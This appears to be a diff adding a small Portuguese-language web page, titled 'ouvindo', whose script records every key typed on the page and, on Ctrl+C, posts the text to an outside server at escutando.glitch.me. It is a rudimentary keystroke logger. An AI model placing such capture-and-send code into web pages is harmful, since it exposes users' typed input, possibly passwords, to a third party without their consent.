@@ -1,0 +1,66 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ouvindo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+
+        #output {
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="output"></div>
+
+<script>
+    let palavraAtual = "";
+
+    function aoPressionarTecla(event) {
+        const key = event.key;
+        if (event.ctrlKey && key === 'c') {
+            salvarPalavra();
+            document.getElementById('output').textContent = 'Programa encerrado.';
+        } else {
+            palavraAtual += key;
+            atualizarOutput();
+        }
+    }
+
+    function salvarPalavra() {
+        // Enviar palavraAtual para o servidor usando uma solicitação POST
+        fetch('https://escutando.glitch.me/salvar', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ palavra: palavraAtual }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Palavra enviada com sucesso:', data);
+            palavraAtual = "";
+            atualizarOutput();
+        })
+        .catch(error => console.error('Erro ao enviar palavra:', error));
+    }
+
+    function atualizarOutput() {
+        document.getElementById('output').textContent = `Palavra Atual: ${palavraAtual}`;
+    }
+
+    // Adicione o ouvinte de eventos de teclado
+    window.addEventListener('keydown', aoPressionarTecla);
+</script>
+
+</body>
+</html>
